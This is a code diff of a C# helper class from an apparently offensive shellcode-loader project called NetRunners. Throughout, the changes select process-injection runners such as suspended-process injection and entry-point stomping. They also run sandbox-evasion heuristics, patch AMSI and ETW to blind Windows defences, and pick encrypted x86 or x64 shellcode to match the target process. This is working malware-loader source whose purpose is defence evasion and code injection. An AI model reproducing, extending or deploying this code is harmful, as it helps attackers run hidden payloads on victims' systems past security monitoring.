@@ -21,9 +21,12 @@ namespace NetRunners.Helpers
         /// </affects>
         public static void SelectRunner()
         {
-            //IRunner runner = new DefaultRunner();
+            //IRunner runner = new ClassicDllInjectionRunner();
+            //IRunner runner = new ClassicProcessInjectionRunner();
+            //IRunner runner = new EntryPointStompingProcessInjectionRunner();
             //IRunner runner = new ProcessInjectionRunner();
-            IRunner runner = new EntryPointStompingRunner();
+            IRunner runner = new SuspendedProcessInjectionRunner();
+            //IRunner runner = new DefaultRunner();
 
             return;
         }
@@ -62,14 +65,17 @@ namespace NetRunners.Helpers
         /// </affects>
         public static void PerformChecks()
         {
-            if (
-                !SleepHeuristic.Check()
+            Console.WriteLine("[+] EVASION IN PROGRESS\n");
+            if (!SleepHeuristic.Check()
                 || !NonEmulatedApiHeuristic.Check()
                 || !EtwPatcher.Patch()
-                || !AmsiPatcher.Patch()
-            )
+                || !AmsiPatcher.Patch())
             {
                 Environment.Exit(1);
+            }
+            else
+            {
+                Console.WriteLine("\n[+] EVASION DONE\n");
             }
         }
         /// <summary>
@@ -80,13 +86,26 @@ namespace NetRunners.Helpers
         /// NetRunnersDll.dll
         /// NetRunnersSvc.exe
         /// </affects>
-        public static byte[] GetPayload()  // for shellcode runners
+        public static byte[] SelectPayloadArchitecture(bool? IsRemote32BitProcess = null)
         {
-            // define buf var using bitness
-            byte[] buf = (IntPtr.Size == 8) 
-                ? Data.EncryptedData.buf                                // x64 payload
-                : Data.EncryptedData.buf86;                             // x86 payload
+            if (IsRemote32BitProcess.HasValue)
+            {
+                // define buf var using bitness of remote process
+                buf = (IsRemote32BitProcess == true)
+                    ? NetRunners.Data.EncryptedData.buf86
+                    : NetRunners.Data.EncryptedData.buf;
 
+                Console.WriteLine("[+] " + (IsRemote32BitProcess == true ? "x86" : "x64") + " shellcode selected for remote process.");
+            }
+            else
+            {
+                // define buf var using bitness of current process
+                buf = (IntPtr.Size == 4)
+                    ? NetRunners.Data.EncryptedData.buf86
+                    : NetRunners.Data.EncryptedData.buf;
+
+                Console.WriteLine("[+] " + ((IntPtr.Size == 4) == true ? "x86" : "x64") + " shellcode selected for current process.");
+            }
             return buf;
         }
         /// <summary>
@@ -97,19 +116,28 @@ namespace NetRunners.Helpers
         /// NetRunnersDll.dll
         /// NetRunnersSvc.exe
         /// </affects>        
-        public static int GetSize()
+        public static int SelectPayloadSize(bool? IsRemote32BitProcess = null)
         {
-            // define buf var using bitness
-            int sBuf = (IntPtr.Size == 8)
-                ? Data.EncryptedData.sBuf                                // x64 payload
-                : Data.EncryptedData.sBuf86;                             // x86 payload
-
+            if (IsRemote32BitProcess.HasValue)
+            {
+                // define sBuf var using bitness of remote process
+                sBuf = (IsRemote32BitProcess == true)
+                    ? NetRunners.Data.EncryptedData.sBuf86
+                    : NetRunners.Data.EncryptedData.sBuf;
+            }
+            else
+            {
+                // define buf var using bitness of current process
+                sBuf = (IntPtr.Size == 4)
+                    ? NetRunners.Data.EncryptedData.sBuf86
+                    : NetRunners.Data.EncryptedData.sBuf;
+            }
             return sBuf;
         }
         /// <summary>
         /// This method selects the correct patch payload on the bitness of the process.
         /// </summary>
-        public static byte[] GetAmsiPatch()
+        public static byte[] SelectAmsiPatch()
         {
             byte[] patch;
 
@@ -123,7 +151,7 @@ namespace NetRunners.Helpers
         /// <summary>
         /// This method selects the correct patch payload on the bitness of the process.
         /// </summary>
-        public static byte[] GetEtwPatch()
+        public static byte[] SelectEtwPatch()
         {
             byte[] patch;
 
@@ -131,6 +159,16 @@ namespace NetRunners.Helpers
             patch = new byte[] { 0xc3 };
 
             return patch;
+        }
+        public static void PrintTechniqueInfo(string techniqueName, string targetProcess = null)
+        {
+            Console.WriteLine("[+] RUNNING SHELLCODE\n");
+            Console.WriteLine($"[+] Technique                :   {techniqueName}");
+            if (!(targetProcess == null))
+            {
+                Console.WriteLine($"[+] Target Process           :   {targetProcess}");
+            }
+            Console.WriteLine("");
         }
     }
 }
